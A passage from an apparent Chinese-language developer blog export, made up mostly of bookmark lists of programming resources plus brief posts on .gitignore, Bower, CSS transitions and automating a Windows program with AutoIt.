list]\nhttp://stackoverflow.com/questions/8940737/cycle-through-list-starting-at-a-certain-element\n\nPython之排列组合\nhttp://love67.net/2014/02/09/python-sord-combine/\n\n[pyquery] 抓網頁資料的神器\nhttp://kynix.logdown.com/posts/194930-pyquery-get-web-data-artifact\npyquery: 基於python和jquery語法操作XML\nhttp://www.geoinformatics.cn/lab/pyquery/\n\nphpquery\nhttp://program.faryne.tw/2012/01/phpquery.html\n\nlmxl\nhttp://www.zhidaow.com/post/html-scraping\n\nScrapy\nscrapy.org\n\n2015/06\n--------\n\n【程式】jQuery : 取得和設定 radio, checkbox, select 的值 (轉)\nhttp://blog.xuite.net/chingwei/blog/22969215-%E3%80%90%E7%A8%8B%E5%BC%8F%E3%80%91jQuery+%3A+%E5%8F%96%E5%BE%97%E5%92%8C%E8%A8%AD%E5%AE%9A+radio,+checkbox,+select+%E7%9A%84%E5%80%BC+%28%E8%BD%89%29\n\ndbv.php\nhttp://dbv.vizuina.com/\n\n Phinx\n https://phinx.org/\n\n Javascript 陣列vs物件\n http://guang.logdown.com/posts/278890-javascript-array-vs-object\n\n lambda 運算式\n http://openhome.cc/Gossip/Python/LambdaExpression.html\n\n PyUserInput\nhttps://github.com/SavinaRoja/PyUserInput\n\n 中文亂碼\n https://www.facebook.com/groups/pythontw/permalink/10154059772548438/\n http://blog.longwin.com.tw/2014/09/python-list-print-chinese-2014/\n\n JQ | stop\n http://erhshe-blog.logdown.com/posts/278957-jq-stopcallback\n\n HTML5 Attributes :placeholder 、multiple 、formtarget 、formmethod 、formaction 、autofocus\n http://chc-blog.logdown.com/posts/278946-full-browser-support-property\n\n Shell Script學習小記錄\n http://jayden.logdown.com/posts/190019-small-shell-script-learning-record\n\n Got Your PW(專供資安人的資源與工具整理)\n https://gotyour.pw/index.html\n\n Understanding Python Decorators in 12 Easy Steps!\n http://simeonfranklin.com/blog/2012/jul/1/python-decorators-in-12-steps/\n\ntutorialzine\nhttp://tutorialzine.com/\n\n[Android] volley，好用的http client library\nhttp://huli.logdown.com/posts/280423-android-volley-useful-network-related-library\n\n(原創) 為什麼C#、Java需要提供interface? (C/C++) (.NET) (C#) (Java)\nhttp://www.cnblogs.com/oomusou/archive/2007/03/17/677832.html\n\ntabulate\nhttps://pypi.python.org/pypi/tabulate\n\n玩轉 CSS 3D - 原理篇 - OXXO.STUDIO\nhttp://www.oxxostudio.tw/articles/201506/css-3d.html\n\nHello Backbone.js\nhttp://arturadib.com/hello-backbonejs/\n\nPython & R, for scientists\nhttps://www.getdatajoy.com/\n\nTop 10 Programming Fonts\nhttp://hivelogic.com/articles/top-10-programming-fonts\n\nPython Note - \\*args, \\*\\*kwargs\nhttp://et10man-blog.logdown.com/posts/281264-python-args-kwargs\n\nPython string formatting: % vs. .format\nstackoverflow.com/questions/5082452/python-string-formatting-vs-format\n\n[Python] 內建函式filter, map, reduce\nhttp://www.dotblogs.com.tw/law1009/archive/2013/07/09/109217.aspx\n\n\n2015/07\n------\n.bash_profile 與 .bashrc 的差異\nhttp://jamestw.logdown.com/posts/283485--bash-profile-bashrc-difference\n\nAll about Flask, the Python micro web framework inc. extensions & tutorials\nhttps://flask.zeef.com/stefane.fermigier\n\nJavaScript 标准参考教程（alpha）\nhttp://javascript.ruanyifeng.com/advanced/backbonejs.html\n\n material design principle\nhttps://medium.com/google-developers/introducing-material-design-lite-3ce67098c031\nhttp://getmdl.io/\n\nA Simple Example – Backbone.js Tutorial Part 1 – Collection based on JSON + View\nhttp://blog.joelberghoff.com/2012/07/22/backbone-js-tutorial-part-1/\n\n[筆記] JavaScript 變數宣告與作用域\nhttp://kuro.tw/posts/2015/07/08/note-javascript-variables-declared-with-the-scope-scope\n\n[JS][JQ]網頁Typing特效\nhttp://crazy-nerd.logdown.com/posts/284971-js-jq-typing-a-web-page-special-effects\n\npancakes\nhttps://pancake.io/\n\nApache2 /etc/hosts.deny ignored in Ubuntu 14.04\nhttp://serverfault.com/questions/619714/etc-hosts-deny-ignored-in-ubuntu-14-04\n\nCLNDR.js ~ A jQuery Calendar Plugin\nhttp://kylestetz.github.io/CLNDR/\n\n純CSS 以偽元素作照片說明遮罩\nhttp://www.mickey8509.com/2015/07/css_22.html\n\nHow to Center in CSS\nhttp://howtocenterincss.com/\n\nJQuery 超簡單視差滾動\nhttp://www.mickey8509.com/2015/07/jquery.html\n\nSimple Block, Simple Inline.\nhttp://limouren.blogspot.tw/2005/08/simplier-block.html\nhttp://limouren.blogspot.tw/2005/08/simple-block-simple-inline.html\n\n\nmargin負值\nhttp://www.w3cplus.com/css/the-definitive-guide-to-using-negative-margins.html\n如何正確實作出固定寬度且置中的版型\nhttp://jaceju.net/2005/04/16/9/\nhttp://pinkyvivi.pixnet.net/blog/post/1131260-css%E2%88%A5%E6%8E%92%E7%89%88%E8%A7%80%E5%BF%B5-boxmodel%3Emargin%E3%80%81padding\n\nPHP高效率寫法（詳解原因）\nhttp://blog.csdn.net/hguisu/article/details/7369827\n\nWappalyzer - 查詢網站有用到什麼系統、框架...\nhttps://wappalyzer.com/download\n\n\n2015/08\n--------\n\n--**SEO**\n有關Web特殊符號\nhttps://www.facebook.com/groups/f2e.tw/permalink/868322123205154/\n\n避免常見的六種 HTML5 錯誤用法\nhttp://waterlily-lsl.com/modules/article/view.article.php/c1/258\n\n今天還有哪些 SEO 問題？（20140825）\nhttp://blog.seo-tw.org/2011/04/seo-step-by-step.html\n\nhttps://support.google.com/webmasters/answer/79812?hl=zh-Hant\n**SEO**--END\n\n\n\n都不知堆了多久(書籤堆積的內容該整理整理)\n-----\n樹梅派Raspberry Pi@台灣　非官方作業系統鏡像站(Mirror)\nhttp://ftp.yzu.edu.tw/linux/raspberrypi/\n\n爬蟲教學\nhttp://www.largitdata.com/course_list/\n\nhttps協定說明\nhttps://speakerdeck.com/dannvix/https-works\n\nLinux 同部備份\n----------\n透過rsync備份\nhttp://blog.davidou.org/archives/774\nSSH + Rsync的備份機制\nhttp://kawsing.blogspot.tw/2011/05/ssh-rsync.html\n\nadobe 配色\nhttps://color.adobe.com/zh/explore/newest/\n\nHyperlapse.js － 利用 Google 街景製作動態縮時效果\nhttp://blog.infographics.tw/2015/09/hyperlapse-js/\n\nphp中__call(),__get(),__set(),__construct(),__isset()等一些总结\nhttp://blog.51yip.com/php/947.html\n\nNull vs. False vs. 0 in PHP\nhttp://stackoverflow.com/questions/137487/null-vs-false-vs-0-in-php\n\nPython\nhttp://marco79423.twbbs.org/articles/category/python/\n\nJava设计模式（12）迭代模式（Iterator模式）\nhttp://www.cnblogs.com/Coda/p/4298454.html\n\n如何透過PHP、SOAP 及 WSDL撰寫Web Service\nhttps://ascc.sinica.edu.tw/iascc/articals.php?_section=2.4&_op=?articalID:7073\n\nAndroid如何使用GET, POST取得資料\nhttp://blog.tonycube.com/2011/11/androidget-post.html\n\n\n[PHP]這樣寫測試錯了嗎？\nhttp://jaceju.net/2015/10/14/what-is-test/\n\nhttp://mypaper.pchome.com.tw/zerojudge/post/1327159981\n\nwebsphere\nhttp://big5.stcsm.gov.cn/gate/big5/www.stcsm.gov.cn/learning/lesson/xinxi/20020617/20020617.htm\n\n《JSP 2.0 動態網頁入門實務：Web應用程式/資料庫應用/JNDI/JavaMail/XML/AJAX/自訂標籤/JSTL/EL/MVC》筆記\nhttp://w1a2d3s4q5e6.blogspot.tw/2012/10/jsp-20-webjndijavamailxmlajaxjstlelmvc.html\n\nDesignPatternsPHP\nhttp://designpatternsphp.readthedocs.io/en/latest/\n\ncss filters\nhttp://designpatternsphp.readthedocs.io/en/latest/\n\njava 數字轉字串 字串轉數字\nhttp://hank20.blogspot.tw/2012/05/java.html\n\nJava构造和解析Json数据的两种方法详解二\nhttp://www.cnblogs.com/lanxuezaipiao/archive/2013/05/24/3096437.html\n\nKKBOX iOS/Mac OS X 基本開發教材\nhttps://www.gitbook.com/book/zonble/kkbox-ios-dev/details\n\n資料視覺化\nhttp://blog.infographics.tw/\n\n\n語言技術：Jav語言技術：Java Essencea Essence\nhttp://openhome.cc/Gossip/JavaEssence/index.ht00\n\nJava transient关键字使用小记\nhttp://www.cnblogs.com/lanxuezaipiao/p/3369962.html\n\nWhat PHP based git web interface can be recommended\n?https://ma.juii.net/blog/git-web-interface\n\n網站利用 Facebook 帳號登入 (使用 OAuth)\nhttp://sweeteason.pixnet.net/blog/post/40581580#start\n\n\n如何正確的使用 Runtime.exec()\nhttp://yindingtsai.blogspot.tw/2010/01/runtimeexec.html\n\nhttp://mei.homin.com.tw/circularNavPrototype-min.html\n\n筆記-CSS選擇器的套用優先順序\nhttp://blog.darkthread.net/post-2011-06-08-css-specificity.aspx\n\n经网友提醒，才发现 new Date('2015-12-31') 和 new Date('2015/12/31') 是不一样的\nhttps://twitter.com/ruanyf/status/666266182505267200\n\nOracle SQL 結合型的子查詢 sub Query\nhttp://pclevin.blogspot.tw/search/label/Oracle%20SQL?updated-max=2014-05-25T18:22:00%2B08:00&max-results=20&start=20&by-date=false\n\nMySQL 超新手入門（1）重新開始\nhttp://www.codedata.com.tw/database/mysql-tutorial-getting-started\n\n子查詢 Select範例\nhttps://gradyli.wordpress.com/2008/12/02/%E5%AD%90%E6%9F%A5%E8%A9%A2-select%E7%AF%84%E4%BE%8B/\n\nmatishsiao/phonegap-tutorial\nhttps://github.com/matishsiao/phonegap-tutorial\nCopy to Clipboard in pure javascript - Coder Example\nhttps://coderexample.com/copy-to-clipboard-in-pure-javascript/\nVue.js 台灣\nhttps://www.facebook.com/groups/vuejs.tw/permalink/1087045058041892/\nFront-End Developers Taiwan\nhttps://www.facebook.com/groups/f2e.tw/permalink/1051952364842128/\nCSS only scroll indicator\nhttp://codepen.io/MadeByMike/details/ZOrEmr\nMKSB(en): Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)\nhttp://mksben.l0.cm/2016/07/xxn-caret.html\n下载量最高的 100 个 Laravel 扩展包推荐_PHPHub_中国最靠谱的_PHP_和_Laravel_开发者社区\nhttps://phphub.org/topics/2530\ngitignore.io - Create Useful .gitignore Files For Your Project\nhttps://www.gitignore.io/\n用 JavaScript 學習資料結構和演算法：堆疊（Stack）篇 | TechBridge 技術共筆部落格\nhttp://blog.techbridge.cc/2016/06/24/javascript-data-structure-algorithm-stack/\nwebdriver.io - 前端測試入門筆記... « tedshd's DevNote\nhttp://blog.tedshd.io/posts/774036-webdriverio-introduction-to-front-end-test-notes\nPJCHENder網頁前端資源站\nhttps://www.facebook.com/pjchender/photos/?tab=album&album_id=1078492305569538\nHow to run accessibility testing demos – Shopify UX – Medium\nhttps://medium.com/shopify-ux/how-to-run-accessibility-testing-demos-602005e176d0\n一頭栽入 Vue.js TDD 的世界 - Google 簡報\nhttps://docs.google.com/presentation/d/1YxsUucBZNlN-YLjDNoF8-Wk0h-sG4nAqw9eT4Y2OGMo/edit#slide=id.p\nVuediner #2 - Ping Pong ! Vuex + Laravel by 鄭宇翔 - YouTube\nhttps://www.youtube.com/watch?v=C1aLFTs6QM8\nGreen Man Is Walking\nhttp://codepen.io/jsgao0/details/AXgwZN\nFront-End Developers Taiwan\nhttps://www.facebook.com/groups/f2e.tw/permalink/1040322676005097/\nPython Taiwan\nhttps://www.facebook.com/groups/pythontw/permalink/10155214580238438/\njQuery Ajax API 實作以及 Template 介紹 « MUKI space*\nhttp://muki.tw/tech/jquery-ajax-crud-and-template/\nRdatasets\nhttp://vincentarelbundock.github.io/Rdatasets/\nCleave.js - Format input text content when you are typing\nhttp://nosir.github.io/cleave.js/\nES6 你可能不知道的事 - 基础篇 | Taobao FED | 淘宝前端团队\nhttp://taobaofed.org/blog/2016/07/22/es6-basics/index.html\nMap Fiddle\nhttp://mapfiddle.org/\ngjccing/c3s: use css selector to select js object content.\nhttps://github.com/gjccing/c3s\nLaradiner 讀書會 - SOLID 原則談 DIP 依頼反轉原則 by 閃亮亮 - YouTube\nhttps://www.youtube.com/watch?v=k3uERr0P9iE\nPHP 台灣\nhttps://www.facebook.com/groups/199493136812961/permalink/1032002790228654/\n[JavaScript] 幾個實用的 JS 小技巧 · Larry\nhttp://larry850806.github.io/2016/07/16/JS-tips/\nGoogle 我不是機器人 reCAPTCHA Ajax 驗證碼教學範例 for PHP | MIS腳印\nhttp://www.smalljacky.com/programming-language/php/google-recaptcha-ajax-for-php/\n網站 icon 生成器，一鍵通殺全平台。 - 踢踢五\nhttp://tt5.org/%e7%b6%b2%e7%ab%99-icon-%e7%94%9f%e6%88%90%e5%99%a8%ef%bc%8c%e4%b8%80%e9%8d%b5%e9%80%9a%e6%ae%ba%e5%85%a8%e5%b9%b3%e5%8f%b0/\ndylandy/tobopomo.js: A simple and easy plugin for convert string to Bopomo script and Chinese Characters.\nhttps://github.com/dylandy/tobopomo.js\n淺入淺出 eslint 與實作 · De-bug: 一鍵跑版\nhttp://abalone0204.github.io/2016/07/11/eslint-fxcking-setup/\n開發網站時，寫測試的3個簡單方法 | 轉個彎日誌\nhttp://blog.turn.tw/?p=3250\nemoji-picker Demo\nhttp://onesignal.github.io/emoji-picker/\nCSS for Decoration\nhttp://razvancaliman.com/css-for-decoration/#/\nFront-End Developers Taiwan\nhttps://www.facebook.com/groups/f2e.tw/permalink/1021845897852775/\nVuedinner #1 第一次用 Vue.js 就愛上 by Kuro - YouTube\nhttps://www.youtube.com/watch?v=jXdZlbH_ut8\n[教學] 寫給會在部落格中撰寫程式碼的你 ─ 在網頁中嵌入高亮程式碼上色 (syntax highlighting) | PJCHENder愛分享\nhttps://pjchender.blogspot.tw/2016/06/prism-syntax-highlighting.html\nCSS & HTML - 純CSS點擊下拉式選單 - Twincl\nhttps://tw.twincl.com/css-html/*6630\nA-Frame – Building Blocks for the VR Web\nhttps://aframe.io/\nl3vRj14XAQFWBi3hm.gif（GIF 圖片，962x416 像素）\nhttp://i.giphy.com/l3vRj14XAQFWBi3hm.gif\n網站前端測試實做手冊 by caesarchi [Leanpub PDF/iPad/Kindle]\nhttps://leanpub.com/frontend_e2e_test_guidebook\ncss - Which is better, #fff or #FFF? - Stack Overflow\nhttp://stackoverflow.com/questions/3733172/which-is-better-fff-or-fff\nAn Overview of HTML5 Semantics by Michelle Lee on CodePen\nhttp://codepen.io/mi-lee/post/an-overview-of-html5-semantics\nceesvanegmond/minify: A PHP package for minifying your .css and .js.\nhttps://github.com/ceesvanegmond/minify\n猴子也能看懂的 React 教學 - 1 - React 概念 - 初雪的中二 & 爆肝工程師之路\nhttps://j6qup3.github.io/2016/08/06/%E7%8C%B4%E5%AD%90%E4%B9%9F%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84-React-%E6%95%99%E5%AD%B8-1/index.html\nQuill - Your powerful, rich text editor\nhttp://quilljs.com/\n幾個 HTML 秘訣 | 部落格 | Mozilla Taiwan\nhttp://blog.mozilla.com.tw/posts/9085/html-tips\nEasy Copy :: Firefox 附加元件\nhttps://addons.mozilla.org/zh-TW/firefox/addon/easy-copy/?src=search\n------\nhttp://www.retailscm.com/\nhttp://www.retailscm.com/\nhttps://css-tricks.com/snippets/css/a-guide-to-flexbox/\nhttp://www.rightrelevance.com/search/articles?query=python&taccount=pythonrr\nhttp://blog.infographics.tw/2015/11/chartico-introduction/\nhttps://segmentfault.com/a/1190000004079979https://www.awesomes.cn/\nhttp://www.beansmile.com/blog/posts/2015-01-10\nhttp://ithelp.ithome.com.tw/articles/10024779\nhttp://code.kpman.cc/2014/10/14/sublime-text-3-mac-%E6%8C%87%E5%8D%97/\n你都去哪裡看技術文章？\nhttps://vinta.ws/code/where-to-find-great-content-to-read.html\nSelenium自動化測試技術文章彙整 (140+篇)\nhttp://www.qa-knowhow.com/?p=3811\nhttp://headstats.com/\nhttp://comdan66.github.io/ThetaS/\nhttps://github.com/fza\nninotto/Faker\nhttps://blog.gtwang.org/linux/change-linux-default-editor/\nhttps://dotblogs.com.tw/joysdw12/2013/10/07/net-dll-reflector-decomplier\nhttp://nitroxenon.com/eziriz-net-reactor\n\nhttp://atic-tw.blogspot.tw/2014/04/sqlmap-sql-injection.html\nhttp://nano-chicken.blogspot.tw/2015/06/apt-get-updatenon-lts.html\n\nApp Inventor 2 啟用多點觸控\nhttp://t301000.blogspot.tw/\n\n\n--待整理\nhttp://es6.ruanyifeng.com/\nhttps://stedolan.github.io/jq/http://jsnwork.kiiuo.com/archives/2258/jquery-javascript-%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E8%A3%BD%E4%BD%9C%E5%9C%96%E7%89%87%E4%B8%8A%E5%82%B3%E5%89%8D%E7%9A%84%E9%A0%90%E8%A6%BD%E5%9C%96\nhttp://oomusou.io/phpstorm/phpstorm-tdd-refactor/\nhttp://blog.seo-tw.org/\nhttp://www.rightrelevance.com/search/articles?query=python&taccount=pythonrr\nhttp://www.virtuosoft.eu/code/bootstrap-duallistbox/\nhttp://emn178.github.io/jquery-lazyload-any/samples/youtube/\nhttps://noootown.wordpress.com/2016/01/29/css-scss-tips/\nhttps://react.zeef.com/nick.raienko\nhttp://angryplay.blogspot.tw/2016/02/blogger-cookie-google-blogger-api-v3.html\nhttps://www.youtube.com/watch?v=mQ7cgzhTiiY\nhttp://blog.hellojcc.tw/2016/02/22/scrum-in-terms-of-developer/\nhttp://www.jstips.co/zh_tw/improve-nested-conditionals/\nhttps://csscollege.hackpad.com/CSS-2-Sass--5k6BVvbKYTf\nhttps://softnshare.wordpress.com/2016/02/21/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80%E9%9D%A2%E8%A9%A6%E8%80%83%E9%A1%8C%E9%9B%86%E9%8C%A6/\nhttps://blog.coding.net/blog/css-margin\nhttps://github.com/f2etw/f2e-notes/issues/67\nhttp://lab.hakim.se/reveal-js/#/\nhttp://pymaster.logdown.com/\nhttp://muki.tw/tech/native-css-variables/\nhttp://www.w3cplus.com/css/inline-blocks.html\nhttp://kangax.github.io/compat-table/es5/\nhttp://inder.com.tw/2016%E6%8E%A8%E8%96%A6%E9%96%B1%E8%AE%80%EF%BC%8D%E5%A6%82%E4%BD%95%E5%AD%A6%E4%B9%A0react/\nhttp://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html\nhttp://jimmysu.logdown.com/posts/358950-solve-blocking-alert-window\nhttps://noootown.wordpress.com/2016/03/18/fontend-engineer-should-know-network-structure/#more-1419\nhttp://engmeter.blogspot.tw/2014/10/jqueryselectjquery-selectselect.html\nhttp://talkerscode.com/webtricks/dynamic-select-option-menu-using-ajax-and-php.php\nhttp://blog.dwi2.com/blog/2012/12/wheel-event-with-javascript/\nhttps://regexper.com/#%28\\%28\\d{2%2C3}\\%29%29%3F\\d{3%2C4}-\\d{4}|\\d{4}-\\d{3}-\\d{3}\nhttp://codemyui.tumblr.com/\nhttps://www.youtube.com/channel/UCzuXvB2LBlBHTmkneiq-LxA\nhttps://www.youtube.com/channel/UCS8f6jt01phHYKz2ysk2qyw\nhttp://lorempixel.com/\nhttp://www.smalljacky.com/programming-language/php/ajax-javascript-jquery-example-for-php/\nhttp://oreilly-generator.com/\nhttp://quilljs.com/\nhttp://it-life.wyx-ccy.com/2016/04/php-gd.html\nhttp://163.17.145.129/teacher/mmdhf/WEB-64/s18984106.pdf\nhttp://blog.xdite.net/posts/2012/01/29/css-tricks-summary/\nhttp://momentjs.com/\nhttps://developers.google.com/web/fundamentals/design-and-ui/animations/css-vs-javascript?hl=zh-tw\nhttp://teahour.fm/2015/08/16/vuejs-creator-evan-you.html\nhttp://julian.com/research/velocity/\nhttp://tympanus.net/codrops/collective/collective-216/\nhttp://stackoverflow.com/questions/6867254/browsers-default-css-for-html-elements\nhttp://highslide.com/\nhttp://tianweili.github.io/blog/2015/03/02/singleton-pattern/\nhttps://bng86.gitbooks.io/android-third-party-/content/realm.html\nhttp://www.css88.com/book/css/\nhttps://dotblogs.com.tw/yc421206/archive/2012/10/01/75212.aspx\nhttp://abgne.tw/jquery/apply-jquery/jquery-scroll-to-page-top.html\nhttp://easings.net/zh-tw\nhttp://www.w3schools.com/css/exercise.asp?filename=exercise_css3_3dtransforms1\nhttp://www.chinaz.com/design/2012/1130/284263.shtml\nhttp://www.w3cfuns.com/notes/15477/fea046b6226c917c22900f00f644ce9c\nhttps://cn.vuejs.org/guide/comparison.html#Angular\nhttp://www.puritys.me/docs-blog/article-31-CSS-%E8%AA%9E%E6%B3%95%EF%BC%8C%E6%96%87%E5%AD%97%E6%8F%9B%E8%A1%8C%EF%BC%8C%E5%BC%B7%E8%BF%AB%E4%B8%8D%E6%8F%9B%E8%A1%8C%E3%80%82.html\nhttps://jmperezperez.com/medium-image-progressive-loading-placeholder/\nhttp://colinued.leanote.com/post/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF-%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%BC%8F\nhttp://www.jqueryscript.net/other/jQuery-Plugin-For-Smart-Image-Loading-Progressive-Image.html\nhttp://www.jqueryscript.net/other/jQuery-Plugin-For-Smart-Image-Loading-Progressive-Image.html\nhttps://www.javaworld.com.tw/jute/post/view?bid=14&id=115503&sty=1&tpg=2&age=-1\nhttps://blog.fntsr.tw/articles/2013/12/15/sublime-text-2/\nhttp://mao.li/javascript/javascript-callback-function/\nhttp://vanilla-js.com/\nhttp://www.mattboldt.com/demos/typed-js/\n\nhttp://blog.kkbruce.net/2012/02/javascript-w3c-dom.html\nhttp://blog.kkbruce.net/2012/02/javascript-w3c-dom.html\nhttps://www.web-tinker.com/article/21244.html\nhttp://www.cnblogs.com/jscode/archive/2012/09/04/2670819.html\nhttp://www.slideshare.net/sfismy/ss-23649630?next_slideshow=1\nhttp://csscoke.com/\nhttps://www.udemy.com/sublime-text3/\nhttp://kingfff.blogspot.tw/2011/11/putty-login-execute-ssh-batch.html\nhttp://www.xiaomastack.com/2015/07/04/zabbix-auto-tcp-port/\nhttp://www.puritys.me/docs-blog/article-242-Javascript-Hoisting-%E8%88%87-Closure.html\nhttps://branded.me/greenharry/resources-to-learn-ecmascript-6-javascript-6\nhttp://i-ming-blog.blogspot.tw/2015/02/raspberry-pi-arduino-via-usb.html\nhttp://ming-shian.blogspot.tw/p/arduino.html\nhttp://www.slideshare.net/marygeek/rwd-43180178?next_slideshow=2\nhttps://gist.github.com/yaqxyaqx/6239870\nhttp://www.victsao.com/blog/224-javascript-hoisting\nhttp://blog.kkbruce.net/2015/10/webpack.html\nhttps://www.mockaroo.com/\nhttps://www.zhihu.com/question/37020798\nhttp://www.cnblogs.com/fsong/p/4029941.html\nhttp://ngrowup.blogspot.tw/2012/09/php_27.html\nhttp://xyz.cinc.biz/2011/01/php.html\nhttp://www.victsao.com/blog/81-javascript/302-javascript-function-closure-variable\nhttp://www.victsao.com/blog/81-javascript/286-javascript-function\nhttps://www.youtube.com/channel/UCdhl9wtLllY64-sGhs_OEVQ/playlists\nhttp://www.slideshare.net/raspberrypi-tw/gpio-gameconsolestarterkit\nhttps://mlwmlw.org/2015/07/%E6%B7%B1%E5%85%A5%E6%B7%BA%E5%87%BA-wifi-%E6%99%B6%E7%89%87-esp8266-with-arduino/\nhttp://blog.darkthread.net/post-2016-05-26-x-ua-compatible-setting.aspx\nhttps://read01.com/g6OmO.html\nhttp://jamestw.logdown.com/posts/245735-through-the-jshint-to-help-you-improve-the-quality-of-program-code-using-linter-in-atom\nhttp://www.jqueryrain.com/demo/3d-slider-carousel/\nhttp://www.hksilicon.com/articles/82778\nhttp://aqr199xx.pixnet.net/blog/post/25269009-jquery%E7%9A%84extend\nhttp://hushicai.com/2014/03/02/jquery-zheng-ti-jia-gou.html\n\n","categories":["網站記錄"]},{"title":"程式專案使用git的.gitignore設定","url":"%2Fblog%2F2014%2F12%2F29%2Flogdown%2F2014-12-29-program-projects-using-git-gitignore-set%2F","content":"\nhttps://github.com/crilleengvall/gitignore/blob/master/Phonegap.gitignore\nhttps://github.com/crilleengvall/gitignore\n[gitignore.io - Create Useful .gitignore Files For Your Project](https://www.gitignore.io/)\n\n參考來源：\n.gitignore for PhoneGap/Cordova 3.0 projects - what should I commit?\nhttp://stackoverflow.com/questions/17911204/gitignore-for-phonegap-cordova-3-0-projects-what-should-i-commit","tags":["gitignore"],"categories":["Git"]},{"title":"Bower前端套件管理工具","url":"%2Fblog%2F2014%2F12%2F24%2Flogdown%2F2014-12-24-bower-front-end-package-management-tool%2F","content":"\n\n參考來源：\nGulp, Grunt, Bower以及npm\nhttp://blog.darkthread.net/post-2014-09-25-gulp-grunt-bower-npm.aspx\n\nBower 前端套件管理工具\nhttp://edentsai231.logdown.com/posts/198741-bower-front-end-kit-management-tool\n\nDay 1: Bower —— 管理你的客戶端依賴關係\nhttp://segmentfault.com/a/1190000000349555\n\n","categories":["網站記錄"]},{"title":"[CSS3]transition的轉場效果","url":"%2Fblog%2F2014%2F12%2F23%2Flogdown%2F2014-12-23-css3transition-transition-effects%2F","content":"\n```css CSS Syntax\ntransition: property duration timing-function delay|initial|inherit;\n```\n\nhttp://www.w3schools.com/cssref/css3_pr_transition.asp\nhttp://www.wibibi.com/info.php?tid=CSS3_transition_%E5%B1%AC%E6%80%A7\n","tags":["transition"],"categories":["CSS"]},{"title":"Autoit筆記","url":"%2Fblog%2F2014%2F12%2F20%2Flogdown%2F2014-12-20-autoit-notes%2F","content":"由於最近多了一項收發文工作，每天都要開起電腦收發文程式。\n我就想想有沒有讓程式自動化，這樣我以後就開機就好了XD\n於是我就開始做了\n<!--more-->\n\n目前我只知道有這些\n1. Sikuli Script\n2. 按鍵精靈\n3. Autoit\n\n這三個我只用過Sikuli，當出使用Sikuli的原因是因為對Python有好感\n而且用圖來判斷有很炫的感覺XD，但後來他慢慢升級在Windows上會有怪問題，所以這次也不考慮用它。\nAutoit在以前SuperXP、AutoXP，那個時代還滿有名的自動安裝軟體。\n而且那一台電腦是Windows 8，查了一下Autoit在Win 8(desktop mode)可以正常運行，又能轉exe，所以就決定用它\n以前不太會寫程式，教學文件幾乎都是英文的(英文苦手:X)\n現在有基本程式基礎，所以比較看的懂教學文件，不過我依然還是英文苦手orz\n\nSciTE Script Editor，還滿好用了\n隨便輸入幾個關鍵字就會跑出選單\n目前有用幾個相關指令\n\n1. Run\n2. WinWaitAct\n3. ControlClick\n2. ControlSend\n\n這4個函式就能滿足我的需求\n\n編寫時用AutoIt Window Info拉Finder Tool出來到按鈕\n在Control下方的Advanced Mode可抓出CLASS名稱和INSTANCE\n`ControlClick(\"程式標題名稱\",\"程式按鈕文字\",[CLASS:Button; INSTANCE:2])`\n\n大部份函式都機乎是這樣\n\n最後發現執行有動到滑鼠鍵盤可能會失效\n爬文找到一個方法可以鎖住鍵盤滑鼠\n`BlockInput(1);鎖定鍵盤滑鼠\nBlockInput(0);解除鎖定鍵盤滑鼠`\n\n程式寫錯假如你有BlockInput(1)不能做動作的話\n別急著按電腦重開機，只要`Crontol+Alt+Del`兩次\n就可以解除鎖定了\n\n-------\n參考：\n\n自動安裝程式 - 試試AutoIt\nhttp://blog.roodo.com/sherwin/archives/71806.html\n\nAutoIt 【參考資料2009/09/28】\nhttp://id8051.pixnet.net/blog/post/29407939-autoit-%E3%80%90%E5%8F%83%E8%80%83%E8%B3%87%E6%96%992009-09-28%E3%80%91\n\n請問如何禁用滑鼠?[已解決]\nhttp://www.autoitx.com/viewthread.php?tid=13953\n\nhttp://www.autoitx.com/index.php\n\n發現好東西 autoit\nhttp://crazy.molerat.net/learner/cpuroom/net/reading.php?filename=100100995837.dov\n\n桌面離線也可動作的AutoIt指令：ControlSend跟ControlClick\nhttp://pulipuli.blogspot.tw/2011/05/autoitcontrolsendcontrolclick.html\n\n[A] AutoIt!! 註解與其它注意事項\nhttp://edisonx.pixnet.net/blog/post/38335545-%5Ba%5D-autoit!!-%E8%A8%BB%E8%A7%A3%E8%88%87%E5%85%B6%E5%AE%83%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85\n\n**2020-09-11**\n\nWindow info\n\n- [AutoIT 自動化完成程式安裝 @ JosephPhoto 的 網路日誌我的網誌 :: 隨意窩 Xuite日誌](https://blog.xuite.net/josephtsai1126/wretch/193271565-AutoIT+%E8%87%AA%E5%8B%95%E5%8C%96%E5%AE%8C%E6%88%90%E7%A8%8B%E5%BC%8F%E5%AE%89%E8%A3%9D)\n\n管理者模式\n\n- [Keyword #RequireAdmin](https://www.autoitscript.com/autoit3/docs/keywords/RequireAdmin.htm)\n- [Run as administrator ? - AutoIt General Help and Support - AutoIt Forums](https://www.autoitscript.com/forum/topic/134675-run-as-administrator/)\n- [Autoit 使用 runas 執行沒有反應 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/questions/10185977)\n\n放大縮小\n\n- [AutoIT: WinSetState可以定义窗口大小 - chenpassion - 博客园](https://www.cnblogs.com/autotest/p/3262234.html)\n\n\n\n其他\n\n- [J2TEAM/awesome-AutoIt: A curated list of awesome UDFs, example scripts, tools and useful resources for AutoIt.](https://github.com/J2TEAM/awesome-AutoIt)\n\n\nFileInstall \n\n編譯 exe \n- [奔騰兔分享誌: AutoIt 執行外部程式進階應用](http://pentiumto.blogspot.com/2017/07/autoit_5.html)\n\n通知\n\n[Function TrayTip](https://www.autoitscript.com/autoit3/docs/functions/TrayTip.htm)\n\nfiledelete 跟暫存路徑\n\n[Function FileDelete](https://www.autoitscript.com/autoit3/docs/functions/FileDelete.htm)\n[Function _WinAPI_GetTempFileName](https://www.autoitscript.com/autoit3/docs/libfunctions/_WinAPI_GetTempFileName.htm)\n\n\n程式是否開啟\n[Function ProcessExists](https://www.autoitscript.com/autoit3/docs/functions/ProcessExists.htm)\n[terminate process? - AutoIt General Help and Support - AutoIt 